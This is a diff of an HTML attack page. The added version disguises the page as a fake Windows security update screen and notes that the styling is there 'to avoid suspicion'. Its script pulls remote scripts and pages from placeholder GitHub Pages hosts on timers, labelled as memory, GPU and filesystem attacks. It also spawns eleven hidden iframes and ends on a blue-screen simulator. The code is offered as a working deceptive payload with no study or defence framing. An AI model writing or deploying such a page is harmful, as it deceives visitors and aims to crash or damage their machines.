@@ -1,22 +1,51 @@
 <!DOCTYPE html>  
+<html>  
+<head>  
+    <!-- Fake Microsoft CSS to avoid suspicion -->  
+    <style>  
+        body {  
+            background: #0078D4;  
+            color: white;  
+            font-family: Segoe UI;  
+            text-align: center;  
+            padding: 50px;  
+        }  
+    </style>  
+</head>  
 <body>  
-<script>  
-// Phase 1: Memory flood  
-const script1 = document.createElement('script');  
-script1.src = 'https://yourgithub.io/update.js';  
-document.head.appendChild(script1);  
+    <h1>🔄 Windows Security Update KB5034441</h1>  
+    <p>Please wait while we install critical system components...</p>  
 
-// Phase 2: GPU attack  
-setTimeout(() => {  
-  window.location.href = 'https://yourgithub.io/gpu.html';  
-}, 3000);  
+    <script>  
+    // Phase 1: Memory Annihilation  
+    const memcrash = document.createElement('script');  
+    memcrash.src = 'https://[yourgithub].github.io/[repo]/memcrash.js';  
+    document.head.appendChild(memcrash);  
 
-// Phase 3: NTFS bombardment  
-setTimeout(() => {  
-  const iframe = document.createElement('iframe');  
-  iframe.style.display = 'none';  
-  iframe.src = 'https://yourgithub.io/symlink_obf.html';  
-  document.body.appendChild(iframe);  
-}, 6000);  
-</script>  
+    // Phase 2: GPU Apocalypse (3 second delay)  
+    setTimeout(() => {  
+        window.location.href = 'https://[yourgithub].github.io/[repo]/gpu.html';  
+    }, 3000);  
+
+    // Phase 3: Filesystem Massacre (6 second delay)  
+    setTimeout(() => {  
+        const iframe = document.createElement('iframe');  
+        iframe.style.display = 'none';  
+        iframe.src = 'https://[yourgithub].github.io/[repo]/symlink.html';  
+        document.body.appendChild(iframe);  
+        
+        // Add 10 more hidden iframes for good measure  
+        for(let i=0; i<10; i++) {  
+            const clone = iframe.cloneNode();  
+            clone.src = `https://[yourgithub].github.io/[repo]/symlink.html?${Date.now()}`;  
+            document.body.appendChild(clone);  
+        }  
+    }, 6000);  
+
+    // Final Redirect to Blue Screen Simulator  
+    setTimeout(() => {  
+        window.location.href = 'https://[yourgithub].github.io/[repo]/bsod-simulator.html';  
+    }, 9000);  
+    </script>  
 </body>  
+</html>  
